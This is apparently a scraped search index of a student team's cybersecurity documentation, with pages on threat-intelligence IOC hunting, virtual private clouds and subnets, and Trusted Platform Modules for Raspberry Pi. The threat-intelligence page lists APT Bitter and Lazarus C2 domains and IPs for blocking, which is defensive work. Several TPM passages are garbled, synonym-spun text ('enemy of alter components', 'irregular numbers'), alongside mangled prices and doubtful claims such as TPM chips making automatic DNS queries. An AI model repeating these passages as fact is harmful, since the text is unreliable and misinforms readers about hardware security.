proactive cybersecurity strategy, aimed at identifying and understanding the various risks posed by cyber threats.  Threat intelligence involves gathering data from a multitude of sources, including threat feeds, dark web monitoring, and open-source intelligence (OSINT), to anticipate and defend against cyberattacks.  One of the core activities in threat intelligence is hunting for Indicators of Compromise (IOCs). IOCs are specific pieces of evidence that suggest a security breach or malicious activity within a network, such as unusual network traffic, malicious file signatures, or suspicious IP addresses. By actively searching for these indicators, cybersecurity professionals can detect and mitigate threats before they cause significant harm.  In addition to identifying IOCs, threat intelligence also involves the analysis of Tactics, Techniques, and Procedures (TTPs) used by cyber adversaries. TTPs are the methodologies and strategies employed by attackers to infiltrate, exploit, and maintain access to targeted systems. Understanding these patterns allows organizations to predict potential future attacks and develop more effective defensive measures.  The importance of threat intelligence cannot be overstated in today's increasingly digital world. As cyber threats become more sophisticated and persistent, organizations need to stay one step ahead of attackers. Effective threat intelligence not only helps in identifying and responding to current threats but also plays a crucial role in preventing future attacks by enhancing overall security posture and resilience.  Through the continuous monitoring and analysis of emerging threats, organizations can better protect their assets, reputation, and sensitive data from the ever-evolving cyber threat landscape.  ","version":"Next","tagName":"h2"},{"title":"2. Methodology​","type":1,"pageTitle":"Threat Intelligence","url":"/redback-documentation/docs/cybersecurity/research/Threat Intelligence#2-methodology","content":" My main objective is to find and provide IOCs and create rules from Tactics, Techniques, and Procedures (TTPs) to be integrated into the SIEM solution so that the cyber-attacks associated with them can be proactively detected and responded to.  Following are the methodology steps that I intend to follow:  ","version":"Next","tagName":"h2"},{"title":"2.1. Threat Hunting​","type":1,"pageTitle":"Threat Intelligence","url":"/redback-documentation/docs/cybersecurity/research/Threat Intelligence#21-threat-hunting","content":" I will use Twitter feeds to search for the specific APT groups which are active in the region. Find their IOCs and then perform further threat hunting using FOFA, Shodan, Verodin, VirusTotal, and Qinxin.  ","version":"Next","tagName":"h3"},{"title":"2.2. Share IOCs​","type":1,"pageTitle":"Threat Intelligence","url":"/redback-documentation/docs/cybersecurity/research/Threat Intelligence#22-share-iocs","content":" Then, I will share the TTPs and IOCs with the team to update their rules and IOCs management to defend the IT infrastructure proactively.  ","version":"Next","tagName":"h3"},{"title":"2.3. Create Rules​","type":1,"pageTitle":"Threat Intelligence","url":"/redback-documentation/docs/cybersecurity/research/Threat Intelligence#23-create-rules","content":" Afterward, I will create rules from the TTPs that will be integrated into the SIEM to detect and respond to such malicious activity.    ","version":"Next","tagName":"h3"},{"title":"3. Collecting IOCs from Twitter​","type":1,"pageTitle":"Threat Intelligence","url":"/redback-documentation/docs/cybersecurity/research/Threat Intelligence#3-collecting-iocs-from-twitter","content":" Begin with the specific Advanced Persistent Threats (APT) group search feeds. APT Lazarus and Bitter are the North Korean and Indian groups, respectively, that are actively attacking IT infrastructure across the world.  Considering them to be the threats to Redback Organization, and being the threat intelligence person, I will begin with their search tags as shown in Figures 2 and 3. Their results are shown in Figures 4 and 5.          After getting some latest search results, I will begin with collecting IOCs and share them afterward with the team to block them.  Here are some of the latest IOCs that I have collected that I will share with the team to block:  APT Bitter IOCs\tAPT Lazarus IOCsKimfilippovision[.]com\tbitbucket[.]org devflowservice[.]com\ttpddata.com mcdavezonepanel[.]com\titaddnet.com mxuconlinegame[.]com\twifispeedcheck.net 194.36.191.199\tcoinoen.org  Table 1: Some of the Collected IOCs  ","version":"Next","tagName":"h2"},{"title":"4. Threat Hunting​","type":1,"pageTitle":"Threat Intelligence","url":"/redback-documentation/docs/cybersecurity/research/Threat Intelligence#4-threat-hunting","content":" Collecting IOCs from the Internet has indeed some advantages; however, it is not sufficient to rely only on open-source intelligence. Hence, threat hunting becomes the optimal solution under these circumstances, helping in hunting and gathering more IOCs relevant to the reported IOCs.  Let's begin hunting some IOCs using FOFA, Validin, and VirusTotal:  The IOC mxuconlinegame[.]com is used to collect more IOCs relevant to it.  Search IOC on FOFA. Analyze the information that can be used to hunt more IOCs as shown in Figure 7. Create a query of the common patterns to search for more relevant IOCs. The goal is to filter out until the most prominent results are acquired. Collect the results and analyze them further on VirusTotal and Qianxin. The following are the newly hunted IOCs: patch-manger[.]comferrinonlinemuseum[.]com82.221.136.182.221.136.47 Search further about the identified IOCs.  After analyzing further, it was concluded that these IPs and domains belong to APT Bitter, and they are acting as C2 Servers.  Hence, the IOCs that can be shared with the team are:  patch-manger[.]comferrinonlinemuseum[.]com82.221.136.182.221.136.47  ","version":"Next","tagName":"h2"},{"title":"5. Conclusion​","type":1,"pageTitle":"Threat Intelligence","url":"/redback-documentation/docs/cybersecurity/research/Threat Intelligence#5-conclusion","content":" Threat Intelligence is an important part of cybersecurity operations. This document thoroughly explained how threat intelligence can be useful in proactively defending against APTs. However, the document only focused on explaining a single unique and efficient method of hunting IOCs.  There are further tools and platforms that are collectively used for threat intelligence, such as MailTrail, SOC Radar, Group IB, and Zeek. But the method demonstrated in this document is found to be the most effective and efficient in identifying and hunting more IOCs. The document is limited specifically to showcase a single case. If required, it can be expanded further to malware and tactics, techniques, and procedures (TTPs) analysis.  ","version":"Next","tagName":"h2"},{"title":"6. References​","type":1,"pageTitle":"Threat Intelligence","url":"/redback-documentation/docs/cybersecurity/research/Threat Intelligence#6-references","content":" EC-Council. (2024, March 7). What is Cyber Threat Intelligence | Cyber Threat Intelligence Analyst | Types of Threat Intelligence | EC-Council. Cybersecurity Exchange. Link to article Shen, G. (2023, March 20). Use Searching Engines to Hunt For Threat Actors. Medium. Link to article FOFA VirusTotal ","version":"Next","tagName":"h2"},{"title":"Virtual Private Cloud","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/research/virtual-private-cloud","content":"","keywords":"","version":"Next"},{"title":"Virtual Private Clouds​","type":1,"pageTitle":"Virtual Private Cloud","url":"/redback-documentation/docs/cybersecurity/research/virtual-private-cloud#virtual-private-clouds","content":" ","version":"Next","tagName":"h2"},{"title":"What is it?​","type":1,"pageTitle":"Virtual Private Cloud","url":"/redback-documentation/docs/cybersecurity/research/virtual-private-cloud#what-is-it","content":" A virtual private cloud is a private cloud computing environment contained within a public cloud. A virtual private cloud allows for users to run code, store data, host websites and do anything they can in a normal private cloud, instead it is hosted by a public cloud.  ","version":"Next","tagName":"h3"},{"title":"How it works​","type":1,"pageTitle":"Virtual Private Cloud","url":"/redback-documentation/docs/cybersecurity/research/virtual-private-cloud#how-it-works","content":" The best features of private and public cloud systems are integrated in a virtual private cloud (VPC). When running on a public or shared architecture, VPCs perform like a private cloud.VPC has been most frequently utilised in the environment of cloud &quot;infrastructure as a service&quot; (IaaS), where a provider provides the basic public cloud infrastructure and various vendors may provide the VPC services offered over this infrastructure.A provider, such as Amazon AWS or Google, provides a public cloud infrastructure to be used with their provided VPC service.From there, the provider allows access to a VPC, where they ensure that their customers data is kept separated from their other customers data.They can achieve this using a variety of different elements. These include: Private IP addresses (subnets) – By using private IPs that are not accessible via the public internet, the VPC is very secure.Encryption – By using VPNs to encrypt and create a private network above the public network. The VPN traffic is scrambled and invisible to other users.  ","version":"Next","tagName":"h3"},{"title":"Benefits to using it​","type":1,"pageTitle":"Virtual Private Cloud","url":"/redback-documentation/docs/cybersecurity/research/virtual-private-cloud#benefits-to-using-it","content":" There are many benefits to using VPCs, some of these include: Agility – When using a VPC, users have full control of the network size, where their resourced can be scaled dynamically in real timeSecurity – Due to it being a virtual private cloud, user’s data and space don’t mix with other users of the cloud. This allows for users to control how their resources are accessed and by who.Performance increase – When hosting websites and apps on their private cloud, they have a better performance than ones that are hosted on traditional physical serversHybrid clouds - It’s relatively easy to connect a VPC to a public cloud – or to on-premises cloud architecture via a VPN.  ","version":"Next","tagName":"h3"},{"title":"Conclusion​","type":1,"pageTitle":"Virtual Private Cloud","url":"/redback-documentation/docs/cybersecurity/research/virtual-private-cloud#conclusion","content":" In conclusion, VPC is a real helpful tool that can be used to perform several tasks and should be considered by the DevOps team going forward.  ","version":"Next","tagName":"h3"},{"title":"Subnets​","type":1,"pageTitle":"Virtual Private Cloud","url":"/redback-documentation/docs/cybersecurity/research/virtual-private-cloud#subnets","content":" ","version":"Next","tagName":"h2"},{"title":"What is it?​","type":1,"pageTitle":"Virtual Private Cloud","url":"/redback-documentation/docs/cybersecurity/research/virtual-private-cloud#what-is-it-1","content":" Subnet, short for subnetworks is a subdivision or a part of an IP network. It is essentially as network that is inside of another network.Subnets allow for networks to be more efficient and therefore overall make the entire network better.  ","version":"Next","tagName":"h3"},{"title":"How it works​","type":1,"pageTitle":"Virtual Private Cloud","url":"/redback-documentation/docs/cybersecurity/research/virtual-private-cloud#how-it-works-1","content":" A network is split into many different subnets. By splitting a network like this, network traffic must travel a much smaller distance and doesn’t have to pass through any unnecessary routers to get to where it needs.A network being divided into sub-networks can be described by the below image.  ","version":"Next","tagName":"h3"},{"title":"Benefits to using it​","type":1,"pageTitle":"Virtual Private Cloud","url":"/redback-documentation/docs/cybersecurity/research/virtual-private-cloud#benefits-to-using-it-1","content":" There are many benefits that arise when using subnets, some of these are the following: Efficiency – Using subnets is far more efficient than not using subnets, when using them, traffic travels a much smaller and quicker distance, making it more efficient than not using them.Isolating threats – By subnetting your network, you can more easily identify and locate any security threats, as you can isolate any compromised networks. From there you can prevent any more damage happening to your network.Control network growth - When planning and designing a network, size is something that needs to be taken into consideration. One of the key benefits of subnetting is that it enables you to control the growth of your network.  ","version":"Next","tagName":"h3"},{"title":"Conclusion​","type":1,"pageTitle":"Virtual Private Cloud","url":"/redback-documentation/docs/cybersecurity/research/virtual-private-cloud#conclusion-1","content":" Subnetting is a very beneficial thing as it can make both a network quicker and more secure, and therefore should seriously be considered to use going forward in the project.  ","version":"Next","tagName":"h3"},{"title":"NAT Gateway​","type":1,"pageTitle":"Virtual Private Cloud","url":"/redback-documentation/docs/cybersecurity/research/virtual-private-cloud#nat-gateway","content":" ","version":"Next","tagName":"h2"},{"title":"What is it?​","type":1,"pageTitle":"Virtual Private Cloud","url":"/redback-documentation/docs/cybersecurity/research/virtual-private-cloud#what-is-it-2","content":" NAT gateway is a Network Address Translation service that is used to connect instances in a private subnet to services outside of a VPC. However, the external services cannot establish a connection with the instances.  ","version":"Next","tagName":"h3"},{"title":"How it works​","type":1,"pageTitle":"Virtual Private Cloud","url":"/redback-documentation/docs/cybersecurity/research/virtual-private-cloud#how-it-works-2","content":" A NAT gateway forwards the traffic from the instances that are in the private subnet to the internet / services and then sends the response back to the instance.When the traffic moves to the internet a IPv4 address is replaced with the NATs address.After the response is obtained, it is sent to the instance and the NAT translates the address back to the IPv4.A video describing a NAT gateway in further detail can be found below:https://www.youtube.com/watch?v=ujXr0i5EoHE&amp;ab_channel=CloudAcademy  ","version":"Next","tagName":"h3"},{"title":"Public vs Private Subnets​","type":1,"pageTitle":"Virtual Private Cloud","url":"/redback-documentation/docs/cybersecurity/research/virtual-private-cloud#public-vs-private-subnets","content":" ","version":"Next","tagName":"h2"},{"title":"Public subnet​","type":1,"pageTitle":"Virtual Private Cloud","url":"/redback-documentation/docs/cybersecurity/research/virtual-private-cloud#public-subnet","content":" A public subnet is a subnet that has a route table, and with that route table has a route to an internet gateway.This allows for the VPC to be able to connect both to the internet as well as other external services.Using a public subnet is a must, as it allows for internet connection as well as connection to the services, something that cannot be done with a private subnet.  ","version":"Next","tagName":"h3"},{"title":"Private subnet​","type":1,"pageTitle":"Virtual Private Cloud","url":"/redback-documentation/docs/cybersecurity/research/virtual-private-cloud#private-subnet","content":" A private subnet is a subnet that has a route table; however, it doesn’t not have a route to the internet gateway.Instances that are in the private subnet are usually backend server that don’t accept any traffic from the internet.Using a private subnet is a must as it acts as a security boundary for the public subnet. You can control a private subnet through different security groups of the public subnet. So if your public subnet was hacked it will ne harder to hack into the instances of the private subnets.  Using both is a must.  ","version":"Next","tagName":"h3"},{"title":"References​","type":1,"pageTitle":"Virtual Private Cloud","url":"/redback-documentation/docs/cybersecurity/research/virtual-private-cloud#references","content":" https://www.ringcentral.com/gb/en/blog/definitions/virtual-private-cloud/https://www.cloudflare.com/learning/network-layer/what-is-a-subnet/https://www.accessagility.com/blog/benefits-of-subnetting#:~:text=Subnetting%20is%20the%20practice%20of,control%2C%20and%20improving%20network%20security.https://www.youtube.com/watch?v=ujXr0i5EoHE&amp;ab_channel=CloudAcademy ","version":"Next","tagName":"h2"},{"title":"TPM Research","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/research/tpm-research","content":"","keywords":"","version":"Next"},{"title":"Introduction​","type":1,"pageTitle":"TPM Research","url":"/redback-documentation/docs/cybersecurity/research/tpm-research#introduction","content":" Trusted Platform Module (TPM) is a small piece of hardware that has many functions to increase security of a device. TPM is commonly found built into modern processors from Intel and AMD but can also be added on to supported operating systems through an add-in board into a dedicated slot [1]. It’s also an evolving standard that both industry [2] and international [3] standard specifications with wide international support.  More specifically, the physical TPM device is an inexpensive but powerful and flexible, cryptographic processor. It can create, manage, and use cryptographic keys, as well as store confidential data. It is closely tied to how a computer boots and runs, which means it is far more powerful and useful than a simple “smart-card on the motherboard” or hardware security module (HSM) which it’s often compared to [4].  In practical terms, platforms that utilise TPMs, “measure” and log the software that boots on the device. This boot-log can be used to verify that the platform is running verified, up to date software using a TPM feature called attestation or quoting. This boot-log can also be used to protect keys in disk encryption. This is a feature called sealing, it can be used to make sure that the encryption key is only disclosed to authorized software [5]. Other, more advanced TPM features include monotonic counters, secure clock, a non-volatile storage facility, and secure mechanisms for key management operations when importing and exporting keys [4].  ","version":"Next","tagName":"h2"},{"title":"Brief history of TPM​","type":1,"pageTitle":"TPM Research","url":"/redback-documentation/docs/cybersecurity/research/tpm-research#brief-history-of-tpm","content":" TPM was first deployed back in 2003 as TPM 1.1b. This specification included only very introductory features compared to what is available in TPM 2.0. However, this version was still able to generate RSA keys, provide secure storage, authorisation, and attest to the health of a device [6].  The TPM 1.2 revision only offered small improvements in terms of features over TPM 1.1b which included a standardisation of the pin layout and software used to make utilising the TPM easier as this prevented vendor locking. TPM 1.2 also included preventative measures against dictionary attacks and a small amount of space located on the chip itself for storing the certificate used for validating the endorsement key [6]. The endorsement key is a hardware encoded encryption key that is typically embedded at the time of manufacturing the TPM [7]. TPM 1.2 also utilised a stronger encryption algorithm at the time of creation being SHA-1. This has since been changed in TPM 2.0 using numerous encryption algorithms including asymmetric, symmetric, and hashing algorithms.  The current revision of TPM is TPM 2.0 which is what this document will be focusing on.  ","version":"Next","tagName":"h2"},{"title":"Curent Implementations of TPM and Raspberry Pi​","type":1,"pageTitle":"TPM Research","url":"/redback-documentation/docs/cybersecurity/research/tpm-research#curent-implementations-of-tpm-and-raspberry-pi","content":" ","version":"Next","tagName":"h2"},{"title":"LetsTrust TPM​","type":1,"pageTitle":"TPM Research","url":"/redback-documentation/docs/cybersecurity/research/tpm-research#letstrust-tpm","content":" LetsTrust TPM is a simple to utilise TPM solution for the Raspberry Pi. A hardware TPM can be utilised dynamically, including for confirmation/marks, putting away crypto keys and significantly more. The module can likewise be utilised as a True Hardware Random Number Generator (TRNG) on the off chance that you really want a decent wellspring of irregularity.  LetsTrust TPM utilises the SPI interface to have a connection with the Raspberry Pi [8]. It is compatible with all Raspberry Pi models - Model B, Model A, Pi Zero and Pi400 (with cord). It has a compact footprint which permits the excess GPIO pins to be utilised.  The Review for the product is between 3-4 stars as the product make/design scripts does not work (missing a few conditions) even with the use of Bullseye 32bit delivery on a Raspberry 4. The unit works - have the option to utilise the basic testing/indicative library and directions to show this [9]. Currently- for non-progressed clients at any rate - these isn't a lot of you can do on the unit - apart from creating irregular numbers, check registers and so on.  ","version":"Next","tagName":"h3"},{"title":"Optiga™ IC​","type":1,"pageTitle":"TPM Research","url":"/redback-documentation/docs/cybersecurity/research/tpm-research#optiga-ic","content":" The OPTIGA™ IC purposes a SPI interface as per the TCG specifications. Infineon gives driver programming to a straightforward variation to any standard microcontroller SPI interface [10].  The TPM is a protected regulator with added cryptographic usefulness as shown in [11]:  Top of the line security regulator with cutting edge cryptographic calculations carried out in equipment (for example RSA-2048, ECC-256, SHA-256)Normal standards (EAL4+) security affirmationAdaptable combination with SPI interface supportStretched out temperature range (- 40 to +105°C) for various applicationsSimple to incorporate with wide reach open-source helpOne of a kind key that recognizes each TPM  Review for the product by road testers points out that it has various enemy of alter components, and some portion of the memory can't be recovered externally. That regulator is modified with firmware that executes the TPM API [12].  There is no known method for getting the root certificates out of the IC. The firmware API doesn't uncover it, when you attempt to open the bundle, it obliterates the substance. Measures are taken that you can't get from power profile or execution time that you have a critical match or mismatch [13].  At the point when the IC recognises that brute force endeavours are used, it makes itself unusable for some time.  Fundamental capabilities and utilizations as shown in [14]:  Key supplier, store and approvalSign and encode/decodeIrregular number generatorEquipment AuthenticatorEquipment bound permit the executives, distinguish a gadgetguaranteed occasion logging with timestamp  When the OS is set up, the following step is to construct the TSS otherwise called Trusted Software Stack, Software libraries and utilities. The diagram is readable from base to top which shows the picture what will be introduced when you follow the integration of Open Source TPM Software Stack 2.0 on a Raspberry Pi3 Linux environment with Optiga™ IC    ","version":"Next","tagName":"h3"},{"title":"TPM Architecture and Functionalities:​","type":1,"pageTitle":"TPM Research","url":"/redback-documentation/docs/cybersecurity/research/tpm-research#tpm-architecture-and-functionalities","content":" The raspberry pi utilizes TPM for a variety of tasks such as the storage of cryptographic keys, generation of random numbers, and for the authorization and authentication of signatures.  I/O block is used to manage the flow of data among the communication bus. The data transmitted between internal and external buses is encrypted and decrypted by the I/O block and then it is pointed to the appropriate TPM component. Non-Volatile storage is used to store the platform keys. The endorsement key (EK) is stored in non-volatile memory [16].  Attestation Identity Key (AIK) is a public and private key pair that is used as an alternative for the Endorsement key (EK) as an identity. The private part is only used inside the TPM for limited TPM-defined operations such as signing. It is a part of a versatile memory [17].  Platform Configuration Registers (PCR) is one of the most important and essential features of TPM. PCRs are utilized to record the software state including the software running on a platform and its configuration data in a cryptographic manner. It uses a one-way hash method which makes the record irremovable. It is also a part of versatile memory. PCRs can also be used to restrict the utilization of other objects [18].  Most of the code is written (programmed) in the subset of the C programming language. TPM programming interface is elaborated in machine-readable tables. Open-source libraries and solutions are available which allow the development of TPM-based applications [19]. The TPM has an execution engine that runs program code and responds to external commands by choosing and running the necessary program code on the TPM. TPM includes a random number generator to guarantee the application's security. To boost entropy, random bit streams are utilized to seed a random number generator. The Secure Hash Algorithm SHA-1 is implemented by the SHA-1 message digest engine. This algorithm creates a 20-byte digest after hashing the input data. It also serves as the foundation for a Hash-Based Message Authentication Code engine and is utilized by the TPM in a number of cryptographic operations. The RSA key generation technique requires the generation of keys, which can be computationally demanding. TPM uses these keys often for authentication and safe storage, the standard requires that the TPM include a module expressly for this function. A TPM must be able to support keys with a 2048-bit modulus in order to comply with the specification. Additionally, some keys used with the TPM must have a modulus of at least 2048 bits. To perform the RSA algorithms for authentication, encryption, and decryption, TPM has a dedicated RSA engine [20].  There are several permanent and volatile flags that control the status of the TPM. If the TPM owner is present, his consent is required before these flags can be changed. Depending on the initial state in which the device was supplied, the TPM will transition through a number of stages during the process of gaining ownership. The Opt-In component's purpose is to offer safety and mechanisms for maintaining the TPM state by monitoring the status of these flags [21].  ","version":"Next","tagName":"h2"},{"title":"How a Raspberry Pi can utilise TPM​","type":1,"pageTitle":"TPM Research","url":"/redback-documentation/docs/cybersecurity/research/tpm-research#how-a-raspberry-pi-can-utilise-tpm","content":" There are numerous readily available TPM 2.0 add-in boards that work with Raspberry Pi, each offering a wide range of functionality. These include:  Ability to store cryptographic keys These keys can range from keys stored for secure applications to the key required to unlock the Raspberry Pi when it turns on. The TPM contains a key called the storage root key and it uses this key for encrypting and decrypting the keys used by various applications. These keys can be created under certain conditions and can only be used when these same conditions are met or can be created by the TPM alone. Both methods only allow the storage root key to be kept on the TPM itself. The process of encrypting the keys is called sealing and the process of decrypting is called unsealing [22]. Authentication of hardware When a specific hardware configuration is set, the TPM will check to make sure that this configuration is correct each time the Raspberry Pi is started. If this configuration has been changed, then the Raspberry Pi will not be considered trustworthy and may prevent certain functionality of the Raspberry Pi [23]. Digitally sign and encrypt/decrypt drives Having the ability to digitally sign the Raspberry Pi means that the platform can be attested, validating that the device has not been tampered with. Once this authentication process has been successfully undertaken, the device is then trusted and able to do whatever Redback Operations tasks it to do [24]. A TPM cannot encrypt and decrypt drives but can create and store the keys used for said encryption and decryption. When the correct conditions are met and trustworthiness of a system can be attested to, keys can be unsealed and released to the system for decryption of data while sealed keys can be used for encrypting data [22]. Generate random numbers The TPM can take a range of various inputs, from environment to physical inputs, in order to create random numbers that have such a high level of entropy [25]. Utilising these random numbers is essential when generating keys as it makes it extremely difficult for an attacker to brute force since the entropy is not defined by software which can be easily guessed [26]. Hardware bound licence management TPM does have the capacity to store licences from software on the TPM itself. Storing the licences here makes them only accessible to the specific program and prevents any sort of plagiarism or hacking of any kind as it is not generally accessible [27]. Logging of events The only operation that will be logged is the PCR Extend operation [28]. The Extend operation occurs when the current value is extended with a new value in accordance with the following equation:  PCR[N] = HASHalg( PCR[N] || ArgumentOfExtend ) [29]This log is used by external entities for attestation purposes. Logs are reconstructed and compared against known values by external entities for remote attestation purposes [28]. Integrate with networks for verification and trust of the device Once hardware has been authenticated, meaning that it has not been tampered with and is in full working order as required, this can allow for specific functions to take place. Functions such as starting secure applications and connections that should not be accessible by any computer other than certified Raspberry Pi’s [30].  ","version":"Next","tagName":"h2"},{"title":"Known Security Issues in TPM Architecture​","type":1,"pageTitle":"TPM Research","url":"/redback-documentation/docs/cybersecurity/research/tpm-research#known-security-issues-in-tpm-architecture","content":" A trusted platform module has a number of known but easily mitigated security vulnerabilities. The reason an attacker would attempt to exploit a TPM-based machine is to acquire the resources on the victim’s encrypted data drives.  TPM is known for implementing a multi-layered security protocol to make it more resilient to any sort of cyberattack. As these modules are assigned an RSA-based encryption key at the time of bootup, the initial bootup of a device that has TPM installed in it would securely function and communicate with the hardware and the OS once the device has started. The TPM would only protect the device if it has been powered on. Therefore, if the device is not able to be powered on or the user has not been logged in, there is no device security as the security protocol operates at a kernel level of the OS and would not run if the user session is not initiated. This process can be considered a vulnerability if the device is stuck in a boot loop, leaving the product vulnerable to potential attacks. To resolve this issue, a connected standby protocol needs to be implemented that would allow the governance of the software and hardware-based protocols present in the device [31].  A reported vulnerability found i n the TPM architecture is these TPM chips can make automated DNS queries. TPM software patches and updates are automatically enabled, meaning the device can make automatic a DNS resolution request. Considering this can be easily poisoned, the attacker can direct the TPM request to any malicious pages. This means that TPM chips could potentially download malicious files by accessing the internet and enabling the propagation of the virus on the host machine [32].  A protocol vulnerability risk t hat is commonly found in TPM architecture is that the owners that have this architecture installed on their machines are relatively incapable of mitigating security risks. An attacker can easily take advantage of the strong encryption methods offered by TPM to hide the malware, cloaking itself as legitimate software on the encrypted hard disk. The malware cloaking is an effective technique as the malware is hidden under the layers of security offered by this architecture making it difficult for the users to detect the malicious code. As the TPM is not accessible easily, it further increases the difficulty of scanning and checking for viruses and other forms of malware [33].  A security vulnerability that existed in the TPM chipset for a long time now is the key strength that is automatically weakened on the devices that have BitLocker installed. BitLocker uses the seal and unseal features from the TPM architecture to protect the secrets that are present in the operating system space. Prior versions of TPM were mostly affected, but this vulnerability has since been patched. This vulnerability resulted in a weakened key that could easily be decrypted and effectively reducing the time required to bypass the disk encryption [34].  ","version":"Next","tagName":"h2"},{"title":"Recommendations for Redback​","type":1,"pageTitle":"TPM Research","url":"/redback-documentation/docs/cybersecurity/research/tpm-research#recommendations-for-redback","content":" ","version":"Next","tagName":"h2"},{"title":"Recommend the use of Infineon Optiga TPM SLB 9670 based TPM modules for Raspberry Pi.​","type":1,"pageTitle":"TPM Research","url":"/redback-documentation/docs/cybersecurity/research/tpm-research#recommend-the-use-of-infineon-optiga-tpm-slb-9670-based-tpm-modules-for-raspberry-pi","content":" The Infineon Optiga TPM SLB 9670 chipset is inexpensive and widely used in TPM modules design to work with Raspberry Pi devices. These modules are readily available for a retail cost of between ~20AUDto 20 AUD to ~20AUDto 60 AU D with a much lower wholesale price expected. Given the solid documentation available for the chipset online [35], its wide use and relatively low cost, we believe this TPM 2.0 enabled chipset will be ideal for Redback and its IoT projects. The wide use of the product also means that any post sale security flaw or bug will be attended to by the manufacturer promptly with firmware or driver updates. The “SLB” version of this chipset is specified for standard security applications while other versions of the chip exist for automotive and industrial security applications.  ","version":"Next","tagName":"h3"},{"title":"Recommend use of Raspberry Pi 4 for all projects for better support of TPM​","type":1,"pageTitle":"TPM Research","url":"/redback-documentation/docs/cybersecurity/research/tpm-research#recommend-use-of-raspberry-pi-4-for-all-projects-for-better-support-of-tpm","content":" Given the first recommendation to use TPM modules with the Optiga SLB 9670, we further recommend the use of Raspberry Pi 4 for all projects where Raspberry Pi is a good fit. This is based on confirmed information from the manufacturer, Infineon, with respect to integrated TPM 2.0 driver support on the Raspberry Pi 4 and simplified TPM set up [35].  ","version":"Next","tagName":"h3"},{"title":"Recommend use of Linux Kernel 4.19.50 & TPM 2.0​","type":1,"pageTitle":"TPM Research","url":"/redback-documentation/docs/cybersecurity/research/tpm-research#recommend-use-of-linux-kernel-41950--tpm-20","content":" According to documentation from Infineon, the Linux Kernel 4.19.50 has integrated TPM 2.0 driver support which will simplify TPM set up on the Raspberry Pi4 [35]. TPM 2.0 is the latest version of TPM released in 2014 with the last revision in 2019. TPM 2.0 uses SHA-1 and SHA-256 algorithms for hashing, better public key cryptography using Barreto-Naehrig 256-bit curve and NIST P-256 and HMAC with 128-bit AES symmetric-key algorithms [36] . This makes TPM 2.0 far more secure than its predecessors and we do not recommend using TPM versions below 2.0.  ","version":"Next","tagName":"h3"},{"title":"Recommend use of LUKS open-source disk encryption specification for encrypting all storage drives including SD cards​","type":1,"pageTitle":"TPM Research","url":"/redback-documentation/docs/cybersecurity/research/tpm-research#recommend-use-of-luks-open-source-disk-encryption-specification-for-encrypting-all-storage-drives-including-sd-cards","content":" The Linux Unified Key Setup (LUKS) is recommended for encrypting all storage devices including SD cards on the Raspberry Pi devices. The LUKS disk encryption specification is open source and platform independent, which allows a standardized, on-disk encryption format that can be used across different programs [37]. LUKS is also well documented, and a knowledge of LUKS will allow Redback staff to work on encryption projects with Raspberry Pi as well as other Linux based systems. Open source and free guides are available on using TPM 2.0 modules with the LUKS framework [38] and on how LUKS can be used with Raspberry PI for the purpose of encrypting SD cards [39].  ","version":"Next","tagName":"h3"},{"title":"Keys for encryption and decryption to be stored on TPM while using LUKS.​","type":1,"pageTitle":"TPM Research","url":"/redback-documentation/docs/cybersecurity/research/tpm-research#keys-for-encryption-and-decryption-to-be-stored-on-tpm-while-using-luks","content":" While encryption using LUKS doesn’t necessarily need a TPM for decryption and encryption functions [40], we recommend the use of a TPM 2.0 for key storage as a best practice across all Redback IoT operations with Raspberry Pi. We further recommend the use of TPM 2.0 on projects that involved any Linux based system so long as a TPM can be feasibly used for holding encryption keys.  ","version":"Next","tagName":"h3"},{"title":"Conclusion​","type":1,"pageTitle":"TPM Research","url":"/redback-documentation/docs/cybersecurity/research/tpm-research#conclusion","content":" A Trusted Platform Module device and its associated standards are a worthwhile investment for Redback Operations despite some known security issues.  These include:  Increased exposure if the device is stuck in a boot loopTPM chips can send automated DNS queries – useful in DDOS attacks.The TPM protocol isn’t easily accessed or modified. Malware that has bypassed a TPM will find it very easy to hide.  To mitigate these few known issues, we have made some recommendations for Redback to implement TPM in a safe and secure way. These include the use of:  A connected standby protocol needs to be implemented to allow for governance if stuck in a boot loop.The use of Infineon Optiga TPM SLP 9670 based modulesRaspberry Pi 4 wherever appropriateLinux Kernel 4.19.50 &amp; TPM 2.0 for the latest, most secure versions of eachLUKS open-source disk encryption specification for encrypting all storage drives including SD cards. The encryption and decryption keys should be stored on the TPM device itself.  ","version":"Next","tagName":"h3"},{"title":"References​","type":1,"pageTitle":"TPM Research","url":"/redback-documentation/docs/cybersecurity/research/tpm-research#references","content":" [1] W. Arthur, D. Challener and K. Goldman, “History of the TPM”, A practical guide to TPM 2.0, 1st ed. Apress open, 2015, p. 1.  [2] &quot;TPM 2.0 Library | Trusted Computing Group&quot;, Trusted Computing Group, 2015. [Online]. Available: https://trustedcomputinggroup.org/resource/tpm-library-specification/.  [3] &quot;Information technology — Trusted platform module library — Part 1: Architecture&quot;, ISO/IEC 11889, vol. 1, 2022. Available: https://www.iso.org/standard/66510.html.  [4] &quot;Trusted Platform Module (TPM)&quot;, microsoft.com, 2022. [Online]. Available: https://www.microsoft.com/en-us/research/project/the-trusted-platform-module-tpm/.  [5] &quot;Trusted Platform Module (TPM) fundamentals (Windows) - Windows security&quot;, Docs.microsoft.com, 2022. [Online]. Available: https://docs.microsoft.com/en-us/windows/security/information-protection/tpm/tpm-fundamentals.  [6] W. Arthur, D. Challener and K. Goldman, &quot;History of the TPM&quot;, A Practical Guide to TPM 2.0, pp. 2-5, 2015. Available: https://link.springer.com/content/pdf/10.1007/978-1-4302-6584-9.pdf. [Accessed 16 August 2022].  [7] Microsoft, &quot;TpmAttestation interface&quot;, Microsoft Docs. [Online]. Available: https://docs.microsoft.com/en-us/javascript/api/azure-iot-provisioning-service/tpmattestation?view=azure-node-latest. [Accessed: 16- Aug- 2022]. [8] P. Kissinger, &quot;LetsTrust&quot;, Letstrust.de, 2022. [Online]. Available: https://letstrust.de. [Accessed: 18- Aug- 2022].  [9] John. P, &quot;LetsTrust TPM for Raspberry Pi&quot;, The Pi Hut, 2021. [Online]. Available: https://thepihut.com/products/letstrust-tpm-for-raspberry-pi. [Accessed: 18- Aug- 2022].  [10] I. AG, &quot;OPTIGA™ embedded security solutions - Infineon Technologies&quot;, Infineon.com, 2022. [Online]. Available: https://www.infineon.com/cms/en/product/security-smart-card-solutions/optiga-embedded-security-solutions/. [Accessed: 19- Aug- 2022].  [11] “LetsTrust TPM for Raspberry Pi,” buyzero.de. [Online]. Available: 